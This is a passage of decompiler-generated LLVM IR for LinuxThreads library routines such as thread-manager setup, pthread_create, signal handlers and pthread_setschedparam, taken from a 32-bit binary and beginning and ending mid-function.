  uselistorder label %dec_label_pc_80595c6, { 1, 0 }
  uselistorder label %dec_label_pc_8059539, { 1, 0 }
  uselistorder label %dec_label_pc_80594f3, { 1, 0 }
  uselistorder label %dec_label_pc_80594e6, { 1, 0 }
}

define i32 @__pthread_initialize_manager(i32 %arg1) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_8059634 = load i32, i32* @ebx, align 4
  %v0_805963b = load i32, i32* @global_var_8079c60.618, align 32
  %v1_8059640 = inttoptr i32 %v0_805963b to i32*
  store i32 1, i32* %v1_8059640, align 4
  %v0_8059646 = load i32, i32* @global_var_8079c4c.565, align 4
  %v1_8059646 = icmp eq i32 %v0_8059646, 0
  %v1_805964d = icmp eq i1 %v1_8059646, false
  br i1 %v1_805964d, label %dec_label_pc_8059654, label %dec_label_pc_805964f

dec_label_pc_805964f:                             ; preds = %entry
  %v1_805964f = call i32 @pthread_initialize(i32 %v0_8059634)
  br label %dec_label_pc_8059654

dec_label_pc_8059654:                             ; preds = %entry, %dec_label_pc_805964f
  %v0_8059654 = load i32, i32* @global_var_807df14.588, align 4
  %factor = mul i32 %v0_8059654, 2
  %v3_805965c = add i32 %factor, -32
  store i32 %v3_805965c, i32* %stack_var_-188, align 4
  %v1_8059661 = call i32 @malloc(i32 %v3_805965c)
  store i32 %v1_8059661, i32* @global_var_8079c50.566, align 16
  %v1_8059673 = icmp eq i32 %v1_8059661, 0
  br i1 %v1_8059673, label %dec_label_pc_8059831, label %dec_label_pc_805967b

dec_label_pc_805967b:                             ; preds = %dec_label_pc_8059654
  %v0_805967b = load i32, i32* @global_var_807df14.588, align 4
  %v2_8059683 = mul i32 %v0_805967b, 2
  %v3_8059683 = add i32 %v1_8059661, -32
  %v4_8059683 = add i32 %v3_8059683, %v2_8059683
  store i32 %v4_8059683, i32* @global_var_8079c54.567, align 4
  %v2_805968c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_805968c, i32* %stack_var_-188, align 4
  %v1_8059694 = call i32 @__GI_pipe(i32 %v2_805968c)
  %v8_805969c = icmp eq i32 %v1_8059694, -1
  %v1_805969d = icmp eq i1 %v8_805969c, false
  br i1 %v1_805969d, label %dec_label_pc_80596b2, label %dec_label_pc_805969f

dec_label_pc_805969f:                             ; preds = %dec_label_pc_805967b
  %v0_80596a2 = load i32, i32* @global_var_8079c50.566, align 16
  store i32 %v0_80596a2, i32* %stack_var_-188, align 4
  %v1_80596a8 = call i32 @free(i32 %v0_80596a2)
  br label %dec_label_pc_80597a3

dec_label_pc_80596b2:                             ; preds = %dec_label_pc_805967b
  %v0_80596b2 = load i32, i32* @global_var_807f36c.619, align 4
  %v1_80596b7 = icmp eq i32 %v0_80596b2, 0
  %v2_80596b9 = load i32, i32* @global_var_80750dc.620, align 4
  %v3_80596b9 = select i1 %v1_80596b7, i32 %v2_80596b9, i32 %v0_80596b2
  %v1_80596c0 = icmp eq i32 %v3_80596b9, 0
  store i32 %v3_80596b9, i32* @global_var_80750dc.620, align 4
  br i1 %v1_80596c0, label %dec_label_pc_8059755, label %dec_label_pc_80596cd

dec_label_pc_80596cd:                             ; preds = %dec_label_pc_80596b2
  %v0_80596cd = load i32, i32* @global_var_807f35c.580, align 4
  %v0_80596d2 = load i8, i8* @global_var_80750e0.621, align 32
  %v1_80596d2 = zext i8 %v0_80596d2 to i32
  %v4_80596d2 = or i32 %v1_80596d2, %v0_80596cd
  %v3_80596d8 = trunc i32 %v4_80596d2 to i8
  %v5_80596d8 = icmp slt i8 %v3_80596d8, 0
  %v1_80596da = icmp eq i1 %v5_80596d8, false
  br i1 %v1_80596da, label %dec_label_pc_8059755, label %dec_label_pc_80596dc

dec_label_pc_80596dc:                             ; preds = %dec_label_pc_80596cd
  %v0_80596dc = load i32, i32* bitcast (i32** @global_var_807513c.593 to i32*), align 4
  store i32 %v0_80596dc, i32* @eax, align 4
  store i32 0, i32* @edx, align 4
  %v0_80596e3 = load i32, i32* %stack_var_-188, align 4
  %v1_80596e3 = call i32 @__pthread_lock(i32 %v0_80596e3)
  %v3_80596e8 = load i32, i32* %stack_var_-12, align 4
  %v0_80596f4 = load i32, i32* @global_var_8079c54.567, align 4
  store i32 134576834, i32* %stack_var_-188, align 4
  %v4_80596ff = call i32 @clone(i32 134576834, i32 %v0_80596f4, i32 3840, i32 %v3_80596e8)
  store i32 %v4_80596ff, i32* @eax, align 4
  %v10_8059707 = icmp eq i32 %v4_80596ff, -1
  store i32 %v4_80596ff, i32* @ebx, align 4
  br i1 %v10_8059707, label %dec_label_pc_8059740, label %dec_label_pc_805970e

dec_label_pc_805970e:                             ; preds = %dec_label_pc_80596dc
  store i32 ptrtoint (i32* @global_var_8075120.568 to i32), i32* @global_var_80752cc.622, align 4
  store i32 8, i32* @global_var_80752c8.623, align 8
  store i32 ptrtoint (i32* @global_var_8075120.568 to i32), i32* @global_var_807f364.581, align 4
  store i32 2049, i32* @global_var_8075130.624, align 16
  store i32 %v4_80596ff, i32* @global_var_8075134.571, align 4
  %v0_805973b = call i32 @__linuxthreads_create_event()
  br label %dec_label_pc_8059740

dec_label_pc_8059740:                             ; preds = %dec_label_pc_80596dc, %dec_label_pc_805970e
  %v0_8059743 = load i32, i32* bitcast (i32** @global_var_807513c.593 to i32*), align 4
  store i32 %v0_8059743, i32* %stack_var_-188, align 4
  %v1_8059749 = inttoptr i32 %v0_8059743 to i32*
  %v2_8059749 = call i32 @__pthread_unlock(i32* %v1_8059749)
  %v0_8059751 = load i32, i32* @ebx, align 4
  %v1_8059751 = icmp eq i32 %v0_8059751, 0
  %v1_8059753 = icmp eq i1 %v1_8059751, false
  br i1 %v1_8059753, label %dec_label_pc_8059776, label %dec_label_pc_8059755

dec_label_pc_8059755:                             ; preds = %dec_label_pc_8059740, %dec_label_pc_80596cd, %dec_label_pc_80596b2
  %v3_8059755 = load i32, i32* %stack_var_-12, align 4
  %v0_8059761 = load i32, i32* @global_var_8079c54.567, align 4
  store i32 134575201, i32* %stack_var_-188, align 4
  %v4_805976c = call i32 @clone(i32 134575201, i32 %v0_8059761, i32 3840, i32 %v3_8059755)
  store i32 %v4_805976c, i32* @ebx, align 4
  br label %dec_label_pc_8059776

dec_label_pc_8059776:                             ; preds = %dec_label_pc_8059740, %dec_label_pc_8059755
  %v0_80597bf = phi i32 [ %v0_8059751, %dec_label_pc_8059740 ], [ %v4_805976c, %dec_label_pc_8059755 ]
  %v10_8059776 = icmp eq i32 %v0_80597bf, -1
  %v1_8059779 = icmp eq i1 %v10_8059776, false
  br i1 %v1_8059779, label %dec_label_pc_80597ae, label %dec_label_pc_805977b

dec_label_pc_805977b:                             ; preds = %dec_label_pc_8059776
  %v0_805977e = load i32, i32* @global_var_8079c50.566, align 16
  store i32 %v0_805977e, i32* %stack_var_-188, align 4
  %v1_8059784 = call i32 @free(i32 %v0_805977e)
  store i32 %v0_805977e, i32* @ebx, align 4
  %v3_805978a = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_805978a, i32* %stack_var_-188, align 4
  %v1_8059791 = call i32 @__libc_close(i32 %v3_805978a)
  store i32 %v3_805978a, i32* @ecx, align 4
  store i32 %tmp7, i32* %stack_var_-188, align 4
  %v1_805979e = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_80597a3

dec_label_pc_80597a3:                             ; preds = %dec_label_pc_805969f, %dec_label_pc_805977b
  br label %dec_label_pc_8059831

dec_label_pc_80597ae:                             ; preds = %dec_label_pc_8059776
  store i32 2049, i32* @global_var_8075130.624, align 16
  store i32 %v0_80597bf, i32* @global_var_8075134.571, align 4
  store i32 %tmp7, i32* @global_var_8075304.574, align 4
  %v3_80597ca = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_80597ca, i32* @global_var_807f370.609, align 16
  %v0_80597d6 = load i32, i32* @global_var_807f368.576, align 8
  %v1_80597db = icmp eq i32 %v0_80597d6, 0
  br i1 %v1_80597db, label %dec_label_pc_8059809.preheader, label %dec_label_pc_80597df

dec_label_pc_80597df:                             ; preds = %dec_label_pc_80597ae
  %v0_80597df = load i32, i32* @global_var_8075310.577, align 16
  %tmp17 = icmp slt i32 %v0_80597df, 1
  br i1 %tmp17, label %dec_label_pc_8059809.preheader, label %dec_label_pc_80597e8

dec_label_pc_80597e8:                             ; preds = %dec_label_pc_80597df
  store i32 %v0_80597df, i32* %stack_var_-188, align 4
  %v1_80597ec = call i32 @__GI_raise(i32 %v0_80597df)
  %v1_80597f1 = call i32 @thread_self.7(i32 %v0_80597df)
  store i32 %v1_80597f1, i32* %stack_var_-188, align 4
  %v1_80597f9 = call i32 @__pthread_wait_for_restart_signal(i32 %v1_80597f1)
  br label %dec_label_pc_8059809.preheader

dec_label_pc_8059809.preheader:                   ; preds = %dec_label_pc_80597df, %dec_label_pc_80597ae, %dec_label_pc_80597e8
  %v2_8059809 = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_8059809

dec_label_pc_8059809:                             ; preds = %dec_label_pc_8059809.preheader, %dec_label_pc_8059825
  %v0_8059814 = load i32, i32* @global_var_8075304.574, align 4
  store i32 %v0_8059814, i32* %stack_var_-188, align 4
  %v3_805981a = call i32 @__libc_write(i32 %v0_8059814, i32 %v2_8059809, i32 148)
  %v8_8059822 = icmp eq i32 %v3_805981a, -1
  %v1_8059823 = icmp eq i1 %v8_8059822, false
  br i1 %v1_8059823, label %dec_label_pc_805982f, label %dec_label_pc_8059825

dec_label_pc_8059825:                             ; preds = %dec_label_pc_8059809
  %v0_8059825 = load i32, i32* %stack_var_-188, align 4
  %v1_8059825 = call i32 @__errno_location(i32 %v0_8059825)
  %v1_805982a = inttoptr i32 %v1_8059825 to i32*
  %v2_805982a = load i32, i32* %v1_805982a, align 4
  %v11_805982a = icmp eq i32 %v2_805982a, 4
  br i1 %v11_805982a, label %dec_label_pc_8059809, label %dec_label_pc_8059825.dec_label_pc_805982f_crit_edge

dec_label_pc_8059825.dec_label_pc_805982f_crit_edge: ; preds = %dec_label_pc_8059825
  br label %dec_label_pc_805982f

dec_label_pc_805982f:                             ; preds = %dec_label_pc_8059809, %dec_label_pc_8059825.dec_label_pc_805982f_crit_edge
  br label %dec_label_pc_8059831

dec_label_pc_8059831:                             ; preds = %dec_label_pc_8059654, %dec_label_pc_80597a3, %dec_label_pc_805982f
  %v0_8059838 = phi i32 [ -1, %dec_label_pc_8059654 ], [ -1, %dec_label_pc_80597a3 ], [ 0, %dec_label_pc_805982f ]
  store i32 %v0_8059634, i32* @ebx, align 4
  ret i32 %v0_8059838

; uselistorder directives
  uselistorder i32 %v0_80597df, { 0, 3, 2, 1 }
  uselistorder i32 %v0_80597bf, { 1, 0 }
  uselistorder i32 %v4_80596ff, { 1, 2, 0, 3 }
  uselistorder i32 %v2_805968c, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8059831, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805982f, { 1, 0 }
  uselistorder label %dec_label_pc_8059809, { 1, 0 }
  uselistorder label %dec_label_pc_8059809.preheader, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80597a3, { 1, 0 }
  uselistorder label %dec_label_pc_8059776, { 1, 0 }
  uselistorder label %dec_label_pc_8059740, { 1, 0 }
  uselistorder label %dec_label_pc_8059654, { 1, 0 }
}

define i32 @pthread_create() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_8059839 = load i32, i32* @ebx, align 4
  %v0_8059840 = load i32, i32* @global_var_8075304.574, align 4
  %v2_8059840 = icmp slt i32 %v0_8059840, 0
  %v1_8059847 = icmp eq i1 %v2_8059840, false
  br i1 %v1_8059847, label %dec_label_pc_805985b, label %dec_label_pc_8059849

dec_label_pc_8059849:                             ; preds = %entry
  %v1_8059849 = call i32 @__pthread_initialize_manager(i32 %v0_8059839)
  %v2_8059853 = icmp slt i32 %v1_8059849, 0
  br i1 %v2_8059853, label %dec_label_pc_80598e3, label %dec_label_pc_805985b

dec_label_pc_805985b:                             ; preds = %dec_label_pc_8059849, %entry
  %v1_805985b = call i32 @thread_self.7(i32 %v0_8059839)
  store i32 %v1_805985b, i32* %stack_var_-152, align 4
  store i32 %v1_805985b, i32* @ebx, align 4
  %v2_8059890 = ptrtoint i32* %stack_var_-132 to i32
  store i32 2, i32* %stack_var_-188, align 4
  %v4_8059899 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_8059890)
  %v2_80598a1 = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_80598a1

dec_label_pc_80598a1:                             ; preds = %dec_label_pc_80598bd, %dec_label_pc_805985b
  %v0_80598ac = load i32, i32* @global_var_8075304.574, align 4
  store i32 %v0_80598ac, i32* %stack_var_-188, align 4
  %v3_80598b2 = call i32 @__libc_write(i32 %v0_80598ac, i32 %v2_80598a1, i32 148)
  %v8_80598ba = icmp eq i32 %v3_80598b2, -1
  %v1_80598bb = icmp eq i1 %v8_80598ba, false
  br i1 %v1_80598bb, label %dec_label_pc_80598c7, label %dec_label_pc_80598bd

dec_label_pc_80598bd:                             ; preds = %dec_label_pc_80598a1
  %v0_80598bd = load i32, i32* %stack_var_-188, align 4
  %v1_80598bd = call i32 @__errno_location(i32 %v0_80598bd)
  %v1_80598c2 = inttoptr i32 %v1_80598bd to i32*
  %v2_80598c2 = load i32, i32* %v1_80598c2, align 4
  %v11_80598c2 = icmp eq i32 %v2_80598c2, 4
  br i1 %v11_80598c2, label %dec_label_pc_80598a1, label %dec_label_pc_80598c7

dec_label_pc_80598c7:                             ; preds = %dec_label_pc_80598bd, %dec_label_pc_80598a1
  %v0_80598c7 = load i32, i32* @ebx, align 4
  store i32 %v0_80598c7, i32* @eax, align 4
  %v0_80598c9 = call i32 @suspend.6()
  %v0_80598ce = load i32, i32* @ebx, align 4
  %v1_80598ce = add i32 %v0_80598ce, 52
  %v2_80598ce = inttoptr i32 %v1_80598ce to i32*
  %v3_80598ce = load i32, i32* %v2_80598ce, align 4
  %v4_80598ce = icmp eq i32 %v3_80598ce, 0
  %v1_80598d2 = icmp eq i1 %v4_80598ce, false
  br i1 %v1_80598d2, label %dec_label_pc_80598e0, label %dec_label_pc_80598d4

dec_label_pc_80598d4:                             ; preds = %dec_label_pc_80598c7
  %v1_80598d4 = add i32 %v0_80598ce, 48
  %v2_80598d4 = inttoptr i32 %v1_80598d4 to i32*
  %v3_80598d4 = load i32, i32* %v2_80598d4, align 4
  %v2_80598de = inttoptr i32 %tmp to i32*
  store i32 %v3_80598d4, i32* %v2_80598de, align 4
  %v0_80598e0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80598e0

dec_label_pc_80598e0:                             ; preds = %dec_label_pc_80598c7, %dec_label_pc_80598d4
  %v0_80598e0 = phi i32 [ %v0_80598ce, %dec_label_pc_80598c7 ], [ %v0_80598e0.pre, %dec_label_pc_80598d4 ]
  %v1_80598e0 = add i32 %v0_80598e0, 52
  %v2_80598e0 = inttoptr i32 %v1_80598e0 to i32*
  %v3_80598e0 = load i32, i32* %v2_80598e0, align 4
  br label %dec_label_pc_80598e3

dec_label_pc_80598e3:                             ; preds = %dec_label_pc_8059849, %dec_label_pc_80598e0
  %v0_80598e9 = phi i32 [ 11, %dec_label_pc_8059849 ], [ %v3_80598e0, %dec_label_pc_80598e0 ]
  store i32 %v0_8059839, i32* @ebx, align 4
  ret i32 %v0_80598e9

; uselistorder directives
  uselistorder i32 %v0_8059839, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder label %dec_label_pc_80598e3, { 1, 0 }
  uselistorder label %dec_label_pc_80598e0, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v1_80598ed = call i32 @pthread_initialize(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_80598ed

; uselistorder directives
  uselistorder i32 (i32)* @pthread_initialize, { 1, 0 }
}

define i32 @pthread_handle_sigcancel(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80598f2 = load i32, i32* @ebx, align 4
  store i32 %v0_80598f2, i32* %stack_var_-4, align 4
  %v4_80598f2 = ptrtoint i32* %stack_var_-4 to i32
  %v1_80598f6 = call i32 @thread_self.7(i32 %v0_80598f2)
  store i32 %v1_80598f6, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_80598ff = icmp eq i32 %v1_80598f6, 134697248
  %v1_8059904 = icmp eq i1 %v6_80598ff, false
  br i1 %v1_8059904, label %dec_label_pc_8059912, label %dec_label_pc_8059906

dec_label_pc_8059906:                             ; preds = %entry
  %v2_805990a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805990a, i32* %eax.global-to-local, align 4
  %v2_805990c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805990c, i32* @ebx, align 4
  %v1_805990d = call i32 @__pthread_manager_sighandler(i32 %arg1)
  store i32 %v1_805990d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059912

dec_label_pc_8059912:                             ; preds = %entry, %dec_label_pc_8059906
  %v0_8059959 = phi i32 [ %v1_80598f6, %entry ], [ %v1_805990d, %dec_label_pc_8059906 ]
  %v0_8059912 = load i32, i32* @global_var_8079c58.590, align 8
  %v1_8059912 = icmp eq i32 %v0_8059912, 0
  br i1 %v1_8059912, label %dec_label_pc_8059947, label %dec_label_pc_805991b

dec_label_pc_805991b:                             ; preds = %dec_label_pc_8059912
  %v1_805991b = load i32, i32* bitcast (i32** @global_var_8075300.575 to i32*), align 256
  %v12_805991b = icmp eq i32 %v0_8059959, %v1_805991b
  %v1_8059921 = icmp eq i1 %v12_805991b, false
  br i1 %v1_8059921, label %dec_label_pc_805991b.dec_label_pc_8059939_crit_edge, label %dec_label_pc_8059923

dec_label_pc_805991b.dec_label_pc_8059939_crit_edge: ; preds = %dec_label_pc_805991b
  br label %dec_label_pc_8059939

dec_label_pc_8059923:                             ; preds = %dec_label_pc_805991b
  %v0_805992b = load i32, i32* @global_var_8075134.571, align 4
  %v3_8059931 = call i32 @waitpid(i32 %v0_805992b, i32 0, i32 -2147483648)
  store i32 %v3_8059931, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059939

dec_label_pc_8059939:                             ; preds = %dec_label_pc_805991b.dec_label_pc_8059939_crit_edge, %dec_label_pc_8059923
  %v0_805993c = load i32, i32* @global_var_8079c5c.591, align 4
  %v1_8059942 = call i32 @__GI__exit(i32 %v0_805993c)
  unreachable

dec_label_pc_8059947:                             ; preds = %dec_label_pc_8059912
  %v1_8059947 = add i32 %v0_8059959, 66
  %v2_8059947 = inttoptr i32 %v1_8059947 to i8*
  %v3_8059947 = load i8, i8* %v2_8059947, align 1
  %v4_8059947 = icmp eq i8 %v3_8059947, 0
  br i1 %v4_8059947, label %dec_label_pc_805997f, label %dec_label_pc_805994d

dec_label_pc_805994d:                             ; preds = %dec_label_pc_8059947
  %v1_805994d = add i32 %v0_8059959, 64
  %v2_805994d = inttoptr i32 %v1_805994d to i8*
  %v3_805994d = load i8, i8* %v2_805994d, align 1
  %v4_805994d = icmp eq i8 %v3_805994d, 0
  %v1_8059951 = icmp eq i1 %v4_805994d, false
  br i1 %v1_8059951, label %dec_label_pc_805997f, label %dec_label_pc_8059953

dec_label_pc_8059953:                             ; preds = %dec_label_pc_805994d
  %v1_8059953 = add i32 %v0_8059959, 65
  %v2_8059953 = inttoptr i32 %v1_8059953 to i8*
  %v3_8059953 = load i8, i8* %v2_8059953, align 1
  %v12_8059953 = icmp eq i8 %v3_8059953, 1
  %v1_8059957 = icmp eq i1 %v12_8059953, false
  br i1 %v1_8059957, label %dec_label_pc_8059967, label %dec_label_pc_8059959

dec_label_pc_8059959:                             ; preds = %dec_label_pc_8059953
  store i32 %v4_80598f2, i32* %eax.global-to-local, align 4
  %v2_8059962 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_80598f2)
  store i32 %v2_8059962, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059967

dec_label_pc_8059967:                             ; preds = %dec_label_pc_8059953, %dec_label_pc_8059959
  %stack_var_-24.0 = phi i32 [ %tmp10, %dec_label_pc_8059953 ], [ %v4_80598f2, %dec_label_pc_8059959 ]
  %v0_805996e = phi i32 [ %v0_8059959, %dec_label_pc_8059953 ], [ %v2_8059962, %dec_label_pc_8059959 ]
  %v1_8059967 = add i32 %v0_805996e, 40
  %v2_8059967 = inttoptr i32 %v1_8059967 to i32*
  %v3_8059967 = load i32, i32* %v2_8059967, align 4
  store i32 %v3_8059967, i32* @edx, align 4
  %v1_805996a = icmp eq i32 %v3_8059967, 0
  br i1 %v1_805996a, label %dec_label_pc_805997f, label %dec_label_pc_805996e

dec_label_pc_805996e:                             ; preds = %dec_label_pc_8059967
  store i32 0, i32* %v2_8059967, align 4
  %v0_8059975 = load i32, i32* %eax.global-to-local, align 4
  %v4_805997a = call i32 @siglongjmp(i32 %v3_8059967, i32 1, i32 %v0_8059975, i32 %v0_8059975)
  store i32 %v4_805997a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805997f

dec_label_pc_805997f:                             ; preds = %dec_label_pc_8059967, %dec_label_pc_805994d, %dec_label_pc_8059947, %dec_label_pc_805996e
  %stack_var_-24.1 = phi i32 [ %tmp10, %dec_label_pc_8059947 ], [ %tmp10, %dec_label_pc_805994d ], [ %stack_var_-24.0, %dec_label_pc_8059967 ], [ %stack_var_-24.0, %dec_label_pc_805996e ]
  store i32 %stack_var_-24.1, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 1, 0 }
  uselistorder i32 %v0_8059959, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_80598f6, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 7, 3, 4, 5, 0, 6, 8 }
  uselistorder label %dec_label_pc_805997f, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8059967, { 1, 0 }
  uselistorder label %dec_label_pc_8059939, { 1, 0 }
  uselistorder label %dec_label_pc_8059912, { 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8059986 = call i32 @thread_self.7(i32 ptrtoint (i32* @0 to i32))
  store i32 %arg1, i32* @edx, align 4
  %v2_805998f = add i32 %v1_8059986, 32
  %v3_805998f = inttoptr i32 %v2_805998f to i32*
  store i32 %arg1, i32* %v3_805998f, align 4
  %v1_8059992 = add i32 %v1_8059986, 36
  %v2_8059992 = inttoptr i32 %v1_8059992 to i32*
  %v3_8059992 = load i32, i32* %v2_8059992, align 4
  %v1_8059995 = icmp eq i32 %v3_8059992, 0
  br i1 %v1_8059995, label %dec_label_pc_80599a3, label %dec_label_pc_8059999

dec_label_pc_8059999:                             ; preds = %entry
  %v0_8059999 = load i32, i32* @ecx, align 4
  %v4_805999e = call i32 @siglongjmp(i32 %v3_8059992, i32 1, i32 %v0_8059999, i32 %v0_8059999)
  br label %dec_label_pc_80599a3

dec_label_pc_80599a3:                             ; preds = %entry, %dec_label_pc_8059999
  %v0_80599a6 = phi i32 [ 0, %entry ], [ %v4_805999e, %dec_label_pc_8059999 ]
  ret i32 %v0_80599a6

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @siglongjmp, { 1, 0 }
  uselistorder i32 (i32)* @thread_self.7, { 6, 5, 3, 2, 1, 0, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80599a3, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v1_80599ac = call i32 @__libc_pthread_init(i32 0)
  store i32 %v1_80599ac, i32* @global_var_8079c60.618, align 32
  ret i32 %v1_80599ac
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg3 to i32
  store i32 0, i32* @edx, align 4
  %v0_80599bf = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80599cd = urem i32 %arg1, 1024
  %v2_80599d2 = mul nuw nsw i32 %v1_80599cd, 16
  %v1_80599d5 = add i32 %v2_80599d2, ptrtoint (i32* @global_var_8070f20.578 to i32)
  store i32 %v1_80599d5, i32* @esi, align 4
  store i32 %v1_80599d5, i32* @eax, align 4
  %v1_80599dd = call i32 @__pthread_lock(i32 %v0_80599bf)
  %v0_80599e2 = load i32, i32* @esi, align 4
  %v1_80599e2 = add i32 %v0_80599e2, 8
  %v2_80599e2 = inttoptr i32 %v1_80599e2 to i32*
  %v3_80599e2 = load i32, i32* %v2_80599e2, align 4
  store i32 %v3_80599e2, i32* @ebx, align 4
  %v1_80599e5 = icmp eq i32 %v3_80599e2, 0
  br i1 %v1_80599e5, label %dec_label_pc_80599ee, label %dec_label_pc_80599e9

dec_label_pc_80599e9:                             ; preds = %entry
  %v1_80599e9 = add i32 %v3_80599e2, 16
  %v2_80599e9 = inttoptr i32 %v1_80599e9 to i32*
  %v3_80599e9 = load i32, i32* %v2_80599e9, align 4
  %v4_80599e9 = load i32, i32* @edi, align 4
  %v15_80599e9 = icmp eq i32 %v3_80599e9, %v4_80599e9
  br i1 %v15_80599e9, label %dec_label_pc_80599fe, label %dec_label_pc_80599ee

dec_label_pc_80599ee:                             ; preds = %dec_label_pc_80599e9, %entry
  %v1_80599f2 = inttoptr i32 %v0_80599e2 to i32*
  %v2_80599f2 = call i32 @__pthread_unlock(i32* %v1_80599f2)
  br label %dec_label_pc_8059a57

dec_label_pc_80599fe:                             ; preds = %dec_label_pc_80599e9
  %v1_8059a04 = add i32 %v3_80599e2, 20
  %v2_8059a04 = inttoptr i32 %v1_8059a04 to i32*
  %v3_8059a04 = load i32, i32* %v2_8059a04, align 4
  %v3_8059a07 = call i32 @sched_setscheduler(i32 %v3_8059a04, i32 %tmp5, i32 %v4_80599e9)
  %v8_8059a0f = icmp eq i32 %v3_8059a07, -1
  %v1_8059a10 = icmp eq i1 %v8_8059a0f, false
  br i1 %v1_8059a10, label %dec_label_pc_8059a24, label %dec_label_pc_8059a12

dec_label_pc_8059a12:                             ; preds = %dec_label_pc_80599fe
  %v0_8059a15 = load i32, i32* @esi, align 4
  %v1_8059a16 = inttoptr i32 %v0_8059a15 to i32*
  %v2_8059a16 = call i32 @__pthread_unlock(i32* %v1_8059a16)
  %v1_8059a1b = call i32 @__errno_location(i32 %v0_8059a15)
  %v1_8059a20 = inttoptr i32 %v1_8059a1b to i32*
  %v2_8059a20 = load i32, i32* %v1_8059a20, align 4
  br label %dec_label_pc_8059a57

dec_label_pc_8059a24:                             ; preds = %dec_label_pc_80599fe
  %v1_8059a26 = icmp eq i32 %arg2, 0
  br i1 %v1_8059a26, label %dec_label_pc_8059a30, label %dec_label_pc_8059a2a

dec_label_pc_8059a2a:                             ; preds = %dec_label_pc_8059a24
  %v2_8059a2e = load i32, i32* %arg3, align 4
  br label %dec_label_pc_8059a30

dec_label_pc_8059a30:                             ; preds = %dec_label_pc_8059a24, %dec_label_pc_8059a2a
  %v0_8059a33 = phi i32 [ 0, %dec_label_pc_8059a24 ], [ %v2_8059a2e, %dec_label_pc_8059a2a ]
  %v2_8059a33 = add i32 %v3_80599e2, 24
  %v3_8059a33 = inttoptr i32 %v2_8059a33 to i32*
  store i32 %v0_8059a33, i32* %v3_8059a33, align 4
  %v0_8059a36 = load i32, i32* @esi, align 4
  %v1_8059a37 = inttoptr i32 %v0_8059a36 to i32*
  %v2_8059a37 = call i32 @__pthread_unlock(i32* %v1_8059a37)
  %v0_8059a41 = load i32, i32* @global_var_8075304.574, align 4
  %v2_8059a41 = icmp slt i32 %v0_8059a41, 0
  br i1 %v2_8059a41, label %dec_label_pc_8059a5a, label %dec_label_pc_8059a4a

dec_label_pc_8059a4a:                             ; preds = %dec_label_pc_8059a30
  %v3_8059a4d = load i32, i32* %v3_8059a33, align 4
  %v1_8059a50 = call i32 @__pthread_manager_adjust_prio(i32 %v3_8059a4d)
  br label %dec_label_pc_8059a57

dec_label_pc_8059a57:                             ; preds = %dec_label_pc_8059a12, %dec_label_pc_80599ee, %dec_label_pc_8059a4a
  %v0_8059a614 = phi i32 [ %v2_8059a20, %dec_label_pc_8059a12 ], [ 3, %dec_label_pc_80599ee ], [ 0, %dec_label_pc_8059a4a ]
  br label %dec_label_pc_8059a5a

dec_label_pc_8059a5a:                             ; preds = %dec_label_pc_8059a30, %dec_label_pc_8059a57
  %v0_8059a61 = phi i32 [ 0, %dec_label_pc_8059a30 ], [ %v0_8059a614, %dec_label_pc_8059a57 ]
  ret i32 %v0_8059a61

; uselistorder directives
  uselistorder i32 %v4_80599e9, { 1, 0 }
  uselistorder i32 %v3_80599e2, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8059a5a, { 1, 0 }
  uselistorder label %dec_label_pc_8059a57, { 2, 0, 1 }
